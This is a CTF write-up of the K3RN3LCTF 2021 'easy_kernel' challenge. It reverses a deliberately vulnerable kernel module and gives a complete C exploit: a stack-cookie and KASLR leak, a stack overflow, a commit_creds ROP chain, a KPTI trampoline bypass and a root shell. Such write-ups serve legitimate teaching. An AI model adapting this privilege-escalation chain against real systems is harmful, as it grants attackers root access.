---
title: "K3RN3LCTF 2021 — easy_kernel"
date: 2021-11-12
category: "pwn"
tags: ["ctf", "kernel", "rop", "kaslr", "kpti", "privesc"]
description: "Linux kernel exploitation for K3RN3LCTF 2021: stack buffer overflow in a kernel module, KASLR leak via sread(), ROP chain, and KPTI trampoline bypass."
draft: false
---
---
title: k3rnel4rmy CTF, easy-kernel
---

## K3RN3LCTF 2021: easy_kernel

This writeup will cover my first foray into linux kernel exploitation. Disclaimer, I just started learning kernel pwn this month, so some information here might be incomplete. I plan to improve it after I learn a little more about the kernel. 

#### Challenge Description
![](https://i.imgur.com/om3Jph8.png)

Since the CTF was held and aimed for beginner-intermediate players, it is a safe assumption that this is an easy and introductory kernel pwn challenge. We are given the remote server details + challenge files in `easy_kernel.tar.gz`

#### Challenge + Environment Files
```shell
testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ ls -la
total 22236
drwxrwxr-x  3 testpwn testpwn     4096 Nov 17 20:44 .
drwxrwxr-x  4 testpwn testpwn     4096 Nov 17 20:43 ..
-rw-rw-r--  1 testpwn testpwn  9037184 Nov 12 07:41 bzImage
-rw-rw-r--  1 testpwn testpwn 11884717 Nov 17 20:44 easy_kernel.tar.gz
drwxrwxr-x 10 testpwn testpwn     4096 Nov 12 07:41 fs
-rw-rw-r--  1 testpwn testpwn  1528343 Nov 12 07:41 initramfs.cpio.gz
-rwxrwxr-x  1 testpwn testpwn      273 Nov 12 07:41 launch_pow.sh
-rwxrwxr-x  1 testpwn testpwn      343 Nov 12 07:41 launch.sh
-rwxrwxr-x  1 testpwn testpwn      107 Nov 12 07:41 rebuild_fs.sh
-rw-rw-r--  1 testpwn testpwn   285344 Nov 12 07:41 vuln.ko

```

we were given a bunch of files which help setup the kernel environment, this includes important files and directories such as `bzImage`, `vuln.ko`, `fs`. the following are a brief description of what the given files are:

- `bzImage`: the compressed Linux kernel, we need to extract this into a `vmlinux` kernel ELF binary to be used for debugging
- `initramfs.cpio.gz`: linux file system that is compressed with `cpio` and `gzip`. 
- `fs`: the decompressed version of the linux file system used. the usual linux files/directories such as `/bin/`, `/etc` + other challenge files can be located here. 
- `vuln.ko`: the vulnerable linux kernel driver, this is the target which needs to be exploited.

First off, we need to extract the kernel ELF from `bzImage` using a script:  [extract_image.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh). This step is needed since we want to get some ROP gadgets that we can use later (and it takes a long time since the kernel is large, so getting ROP gadgets early will save us some time in the long run) 

```shell
testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ ./extract-image.sh bzImage > vmlinux
testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=a7baef9a18852fb290e6ad9d6fccedb84716690d, stripped
testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ ROPgadget --binary ./vmlinux > gadgets.txt
```
The other `.sh` files are some bash scripts which automate some stuff such as taking a look how the  pow is calculated, starting the QEMU emulator and rebuilding/compressing the file system. 

#### rebuild_fs.sh
```bash
#!/bin/bash

pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

```

#### QEMU config

```bash
#!/bin/bash

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

timeout --foreground 180 /usr/bin/qemu-system-x86_64 \
	-m 64M \
	-cpu kvm64,+smep,+smap \
	-kernel $SCRIPT_DIR/bzImage \
	-initrd $SCRIPT_DIR/initramfs.cpio.gz \
	-nographic \
	-monitor none \
	-append "console=ttyS0 kaslr quiet panic=1" \
	-no-reboot
```

Notable flags:
- `-cpu`: specifies the cpu model, here some kernel mitigations are also applied (in this case: `+smep`, `+smap`)
- `-kernel`: specifies which kernel image file to use
- `-initrd`: specifies the compressed file system
- `-append`: specifies additional boot options; kernel command line (?). From this flag we can see that `kaslr` is enabled.

#### Kernel Mitigations

A brief description of the kernel mitigations that are present for this challenge (I need to elaborate on this further, still trying to fully understand how they are used):
- `SMEP`: this feature marks all the userland pages in the page table as non-executable when the process is in kernel-mode. Basically kills ret2usr shellcode.
- `SMAP`: complementing SMEP, this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well.
- `KASLR`: similar to userspace ASLR, it randomizes the base address where the kernel is loaded each time the system is booted.
- `KPTI`: kernel-page table isolation works by better isolating user space and kernel space memory. the qemu launch script doesn't explicitly mention kpti but according to the challenge author, newer kernel versions have it by default:

![](https://i.imgur.com/BXHAqHg.png)

#### Modifying the Environment

Kernel debugging is painful (at least for me who is just getting started with it), so modifying the kernel environment will allow us to have an easier time while developing an exploit. Here are some of the things that I revised in the qemu launch script:

- added the `-s` flag: Shorthand for `-gdb tcp::1234`, i.e. open a gdbserver on TCP port 1234. needed for remote debugging
- disabled `kaslr` by changing the `-append` argument to `nokaslr`

I also commented out a line on the `fs/init` file, basically allowing us to run the kernel as root.

```bash
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t 9p -o trans=virtio,version=9p2000.L,nosuid hostshare /home/ctf

insmod /vuln.ko

chown root /flag.txt
chmod 700 /flag.txt

#exec su -l ctf
/bin/sh
```

#### Reversing the kernel module

Kernel modules are very synonymous to userspace libraries like `libc.so.6`. Modules/Drivers are loaded into kernel space and run with the same privileges as ring-zero. Userspace code can interact with the kernel by first acquiring a handle to a kernel module, then reading/writing data into it through various channels (read/write/ioctl/etc.)

For a better reading, I suggest: https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234

Like what we would normally do with an ELF binary, we can begin by analyzing the module with GHIDRA. Here is the function listing:
![](https://i.imgur.com/kIDVGwG.png)

`init_func` and `exit_func` can be seen as the entry and exit points for the module, respectively. 

```c
int init_func(void)

{
  proc_entry = (proc_dir_entry *)proc_create("pwn_device",0x1b6,0,&fops);
  printk(&module_successfully_initialized);
  return 0;
}

void exit_func(void)

{
  if (proc_entry != (proc_dir_entry *)0x0) {
    proc_remove();
  }
  printk(&module_unloaded);
  return;
}
```

`init_func` registers a device file named `/proc/pwn_device` and we will be interacting with this to exploit the module. 

```c
int sopen(inode *inode,file *file)

{
  printk(&Device_opened);
  return 0;
}
```

`sopen` simply prints the string "Device opened" when we successfuly open the device file. 

```c
ulong sread(undefined8 param_1,ulong userspace_buffer,ulong bytes_to_read)

{
  int copy_success;
  long in_GS_OFFSET;
  undefined8 string_start;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined2 string_end;
  long cookie;
  
  cookie = *(long *)(in_GS_OFFSET + 0x28);
  string_start = 0x20656d6f636c6557;
  local_88 = 0x2073696874206f74;
  local_80 = 0x70206c656e72656b;
  local_78 = 0x6569726573206e77;
  string_end = 0x73;
  copy_success = copy_user_generic_unrolled(userspace_buffer,(ulong)&string_start,bytes_to_read);
  if (copy_success == 0) {
    printk(&%d_bytes_read,bytes_to_read);
  }
  else {
    bytes_to_read = 0xfffffffffffffff2;
  }
  if (cookie == *(long *)(in_GS_OFFSET + 0x28)) {
    return bytes_to_read;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The `sread` functionality simply prints out the string "Welcome to this kernel pwn series\x00" when we do a `SYS_read` call to the file descriptor for `/proc/pwn-device`. It does this by copying the string from the stack into a userspace buffer that we provide.

An important thing to note is that not only do we control the buffer address but also how many bytes we should read. Since we can control `bytes_to_read` this means that we can read arbitrary values from the kernel stack, thus leading to memory leaks allowing us to bypass KASLR. 

![](https://i.imgur.com/xxa61rl.png)

This is what the stack looks like before the call to `copy_user_generic_unrolled`, we can see the welcome string, some kernel address offsets and the kernel stack cookie. We will be retrieving these values later on.

```c
long sioctl(file *file,uint cmd,ulong arg)

{
  printk(&IOCTL_called);
  if (cmd == 0x10) {
    printk(&you_passed:,arg);
  }
  else {
    if (cmd == 0x20) {
      MaxBuffer = (int)arg;
    }
    else {
      printk(&Not_valid_command);
    }
  }
  return 0;
}
```

`sioctl` allows us to change the value of the `MaxBuffer` variable when we provide a cmd value of 0x20. This seems really suspicious. 

```c
ulong swrite(undefined8 param_1,ulong userspace_buffer,ulong bytes_to_copy)

{
  int iVar1;
  long in_GS_OFFSET;
  undefined kernel_buffer [128];
  long cookie;
  
  cookie = *(long *)(in_GS_OFFSET + 0x28);
  if ((ulong)(long)MaxBuffer < bytes_to_copy) {
    printk(&size_too_large);
    bytes_to_copy = 0xfffffffffffffff2;
  }
  else {
    iVar1 = copy_user_generic_unrolled((ulong)kernel_buffer,userspace_buffer,bytes_to_copy);
    if (iVar1 == 0) {
      printk(&bytes_written_to_device,bytes_to_copy);
    }
    else {
      bytes_to_copy = 0xfffffffffffffff2;
    }
  }
  if (cookie == *(long *)(in_GS_OFFSET + 0x28)) {
    return bytes_to_copy;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Now here is the juicy part, it copies data from userspace and stores it into kernel_buffer which is on the kernel stack. Since we can again control `bytes_to_copy` and more importantly `MaxBuffer`, we can induce a buffer overflow. We don't have to worry about the cookie, since we can leak it from `sread`. After that, we have instruction pointer control on the kernel. 

#### Crafting the payload

First off, I reused some template code which helps preserve the state of some registers. This will be useful later for when we want to return from kernel-space back to userland. 

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
```

Next, we open a handle to `/proc/pwn_device` then proceed to read from it.

```c
void main() {

	save_state();
	int fd = open("/proc/pwn_device", O_RDWR);
	unsigned long leakbuf[0x100];

	// Stage 0: leak kernel addresses to defeat kASLR
	read(fd, leakbuf, 0x100);
	for (int i = 0; i < 0x100; i++) printf("%d | %lx\n", i, leakbuf[i]);
```

![](https://i.imgur.com/QHYbR4Z.png)

we successfully read 256 bytes from the device, all which include important kernel addresses and cookie values. After a while of figuring out which addresses we can reliably use, I settled for the ones at indexes 14 and 18. Since kaslr was off while debugging, I calculated the kernel base address offset through the following process:

![](https://i.imgur.com/IS1WrZD.png)

![](https://i.imgur.com/NQ6Lkw3.png)



#### Triggering kernel panic

Currently, here is what our current exploit looks like:
```c
void main() {

	save_state();
	int fd = open("/proc/pwn_device", O_RDWR);
	unsigned long leakbuf[0x100];

	// Stage 0: leak kernel addresses to defeat kASLR
	read(fd, leakbuf, 0x100);
	//for (int i = 0; i < 0x100; i++) printf("%d | %lx\n", i, leakbuf[i]);

	unsigned long kernel_base = leakbuf[18] - 0x23e347;
	unsigned long kernel_cookie = leakbuf[14];

	printf("[*] kernel cookie: 0x%lx\n", kernel_cookie);
	printf("[*] kernel leak: 0x%lx\n", leakbuf[18]);
	printf("[*] kernel base address: 0x%lx\n", kernel_base);

	// Stage 1: overwrite MaxBuffer value -> needed for overflow
	ioctl(fd, 0x20, 0x1337);

	// Stage 2: Try to trigger kernel panic
	int offset = 16;
	unsigned long payload[0x500];
	memset(payload, 'A', sizeof(payload));
	write(fd, payload, 0x500);
}
```

What it simply does is to retrieve values from the leak and calculate the base address for the kernel. Afterwhich, we send an `ioctl` call to overwrite maxsize, allowing us to perform a buffer overflow when we `write` to the device. As we can see, we have triggered a kernel panic since we have overwritten the kernel stack cookie.

![](https://i.imgur.com/CR7qWjo.png)

#### Preserving the Stack Cookie + taking control

When disassembling the `swrite` function, we can see that it loads the cookie into the stack at [rsp + 0x80]:
![](https://i.imgur.com/HdkAZPH.png)

In theory, we can start overwriting the cookie at stack offset 16 (0x80/8). To test the idea, I wrote the following code:

```c
	// Stage 2: Try to trigger kernel panic
	int offset = 16;
	unsigned long payload[16];
	for (int i = 0; i < 16; i++) payload[i] = 0x4141414141414141;
	write(fd, payload, sizeof(payload));
```

Before the call to `copy_user_generic_unrolled`, the stack looks like this:
![](https://i.imgur.com/KQO9fpP.png)

After our payload has been written:
![](https://i.imgur.com/7xO6F8x.png)

We seem to be correct. Notice that what follows after the cookie is some value (0x80) then the return address `0xffffffff8123e2e7` which we can see in the following screenshot:

![](https://i.imgur.com/btmCIhn.png)

I made a small adjustment to my payload, which just preserves the kernel stack cookie, the value next to it with a dummy, then overwriting the return address:

```c
    // Stage 2: Try to trigger kernel panic
	int offset = 16;
	unsigned long payload[50];
	payload[offset++] = kernel_cookie;
	payload[offset++] = 0xdeadbabedeadbabe;
	payload[offset++] = 0x4141414142424242; // return address
	write(fd, payload, sizeof(payload));
```

Running the exploit causes a `general protection fault in user access. non-canonical address` since we have replaced RIP with an invalid address:

![](https://i.imgur.com/0ftF2wY.png)

Now that we can control the kernel instruction pointer, our next phase should be escalating privileges. 

#### Privilege Escalation

Unlike userland exploits in which our target is to spawn a shell, the goal for kernel exploits is different: to escalate the privileges of the running process (the exploit) from some basic user to root, then spawn a root shell. To do this, we take advantage of the `task_struct` structure:

[include/linux/sched.h](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L1039)
```c
struct task_struct {
    
    ...
    
    /* Process credentials: */

    /* Tracer's credentials at attach: */
    const struct cred __rcu		*ptracer_cred;

    /* Objective and real subjective task credentials (COW): */
    const struct cred __rcu		*real_cred;

    /* Effective (overridable) subjective task credentials (COW): */
    const struct cred __rcu		*cred;
```

The kernel tracks the privileges + other additional data of every running process. We are interested in the process credentials. Taking a look at the `cred` struct reveals our key targets:

[/include/linux/cred.h](https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110)

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
```

The cred struct contains the eUID of the task. If we were somehow able to overwrite this value with 0, then we can have root privs. To do this, we use two kernel APIs: `commit_creds` and `prepare_kernel_cred`. 

- prepare_kernel_cred: kernel creates a new `cred` struct. If we pass NULL/0 as the reference struct argument, it will return a cred struct with `root privs`
- commit_creds: commits a new credential set to the current process.

Since these functions are part of the kernel, we can include them into the list of addresses that we want to leak:
![](https://i.imgur.com/3cDE3jS.png)

The next step of our payload will be to construct a rop chain that basically calls `commit_creds(prepare_kernel_cred(0))`

#### Kernel ROP

For this part, I mostly relied on writeups to know which gadgets to use. Initially my exploit code looked like this:

```c
// gadgets
	unsigned long pop_rdi = kernel_base + 0x1518; // pop rdi ; ret
	unsigned long pop_rdx = kernel_base + 0x34b72; // pop rdx ; ret
	unsigned long iretq = kernel_base + 0x23cc2; // iretq
	unsigned long swapgs_ret = kernel_base + 0xc00eaa; // swapgs ; popfq ; ret
	unsigned long cmp_rdx_ret = kernel_base + 0xa30061; // cmp rdx, 8 ; jne 0xffffffff81a3003e ; ret
	unsigned long mov_rdi_rax_ret = kernel_base + 0x3b3504; // mov rdi, rax ; jne 0xffffffff813b34f1 ; xor eax, eax ; ret

	printf("[*] kernel cookie?: 0x%lx\n", kernel_cookie);
	printf("[*] possible kernel offset: 0x%lx\n", leakbuf[18]);
	printf("[*] possible kernel base address: 0x%lx\n", kernel_base);
	printf("[*] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
	printf("[*] commit_creds: 0x%lx\n", commit_creds);

	// Stage 1: overwrite MaxBuffer value -> needed for overflow
	ioctl(fd, 0x20, 0x1337);

	// Stage 2: Try to trigger kbof
	int offset = 16;
	unsigned long payload[50];
	payload[offset++] = kernel_cookie;
	payload[offset++] = 0x0;
	payload[offset++] = pop_rdi;
	payload[offset++] = 0x0;
	payload[offset++] = prepare_kernel_cred;
	payload[offset++] = pop_rdx;
	payload[offset++] = 0x8;
	payload[offset++] = cmp_rdx_ret;
	payload[offset++] = mov_rdi_rax_ret;
	payload[offset++] = commit_creds;
	payload[offset++] = swapgs_ret;
	payload[offset++] = 0x0;
	payload[offset++] = iretq;
	payload[offset++] = user_rip;
        payload[offset++] = user_cs;
        payload[offset++] = user_rflags;
        payload[offset++] = user_sp;
        payload[offset++] = user_ss;
	write(fd, payload, sizeof(payload));
```

The idea was that after calling `prepare_kernel_cred(0)`, the resulting `cred` struct will be moved to `rax`. We need a way to move it from `rax` into `rdi`, passing it as an argument to `commit_creds`. But there is no exact ROP gadget to do just that. Instead we did the following:

```clike
push 0x8;
pop rdx; // moves 8 into rdx
cmp rdx, 8 ; 
jne 0xffffffff81a3003e ; // since rdx is 8, this jump is never taken
ret; // return to the next rop gadget on the stack
   
mov rdi, rax ; // finally mov the cred struct into rdi
jne 0xffffffff813b34f1 ; // uses the ZF from the previous cmp, so this jump is not taken
xor eax, eax ; 
ret; // returns to call commit_creds
```

After that bit, we proceed to the next rop gadget that calls `swapgs` which swaps the `GS` register from kernel-mode to user-mode. Then we continue to call `iretq` which allows us to return to user-mode. 

The problem with this approach is that I wasn't able to return to userland properly. This becomes clear after we return to a userland function, we still see some kernel pointers/addresses in the stack:
![](https://i.imgur.com/8WJ6iV6.png)

The reason is because of KPTI. Even though we have already returned the execution to user-mode, the page tables that it is using is still the kernel’s, with all the pages in userland marked as non-executable.

#### Bypassing KPTI

To bypass KPTI, I used a method called KPTI trampoline. This method is based on the idea that if a syscall returns normally, there must be a piece of code in the kernel that will swap the page tables back to the userland ones, so we will try to reuse that code to our purpose. That piece of code is our KPTI trampoline, and what it does is to swap page tables, swapgs and iretq.

Our kpti_trampoline resides in the function `swapgs_restore_regs_and_return_to_usermode()`. 

![](https://i.imgur.com/ChnilVi.png)

#### Final Payload
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void main() {

	save_state();
	int fd = open("/proc/pwn_device", O_RDWR);
	unsigned long leakbuf[0x100];

	// Stage 0: leak kernel addresses to defeat kASLR
	read(fd, leakbuf, 0x100);
	//for (int i = 0; i < 0x100; i++) printf("%d | %lx\n", i, leakbuf[i]);

	unsigned long kernel_base = leakbuf[18] - 0x23e347;
	unsigned long kernel_cookie = leakbuf[14];
	unsigned long prepare_kernel_cred = kernel_base + 0x881c0;
	unsigned long commit_creds = kernel_base + 0x87e80;
	unsigned long user_rip = (unsigned long)get_shell;

	// gadgets
	unsigned long kpti_trampoline = kernel_base + 0xc00a2f + 22; // grep swapgs_restore_regs_and_return_to_usermode + 22
	unsigned long pop_rdi = kernel_base + 0x1518; // pop rdi ; ret
	unsigned long pop_rdx = kernel_base + 0x34b72; // pop rdx ; ret
	unsigned long iretq = kernel_base + 0x23cc2; // iretq
	unsigned long swapgs_ret = kernel_base + 0xc00eaa; // swapgs ; popfq ; ret
	unsigned long cmp_rdx_ret = kernel_base + 0xa30061; // cmp rdx, 8 ; jne 0xffffffff81a3003e ; ret
	unsigned long mov_rdi_rax_ret = kernel_base + 0x3b3504; // mov rdi, rax ; jne 0xffffffff813b34f1 ; xor eax, eax ; ret

	printf("[*] kernel cookie: 0x%lx\n", kernel_cookie);
	printf("[*] kernel leak: 0x%lx\n", leakbuf[18]);
	printf("[*] kernel base address: 0x%lx\n", kernel_base);
	printf("[*] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
	printf("[*] commit_creds: 0x%lx\n", commit_creds);

	// Stage 1: overwrite MaxBuffer value -> needed for overflow
	ioctl(fd, 0x20, 0x1337);

	// Stage 2: Try to trigger bof -> commit_creds(prepare_kernel_cred(0)) ropchain
	int offset = 16;
	unsigned long payload[50];
	payload[offset++] = kernel_cookie;
	payload[offset++] = 0x0;
	payload[offset++] = pop_rdi;
	payload[offset++] = 0x0;
	payload[offset++] = prepare_kernel_cred;
	payload[offset++] = pop_rdx;
	payload[offset++] = 0x8;
	payload[offset++] = cmp_rdx_ret;
	payload[offset++] = mov_rdi_rax_ret;
	payload[offset++] = commit_creds;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0x0;
	payload[offset++] = 0x0;
	payload[offset++] = user_rip;
        payload[offset++] = user_cs;
        payload[offset++] = user_rflags;
        payload[offset++] = user_sp;
        payload[offset++] = user_ss;
	write(fd, payload, sizeof(payload));
}
```

![](https://i.imgur.com/0o7mu1C.png)

#### My Takeaways

- Linux Kernel pwn is really fun, I look forward to studying it more
- I need to work on my C. my exploit code looks like shit. 
- Need to rewrite this writeup sometime, got a lot of stuff to further understand

#### References

- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ <- most of my writeup is based (and some copied verbatim) around this godsent kernel writeup series
- https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/
- https://pwn.college/modules/kernel
- https://stdnoerr.github.io/ <- really good pwner, learn a lot of stuff from him. 
- https://x3ero0.github.io/posts/easy_kernel_exploitation/ <- writeup to the same chall, need to read this too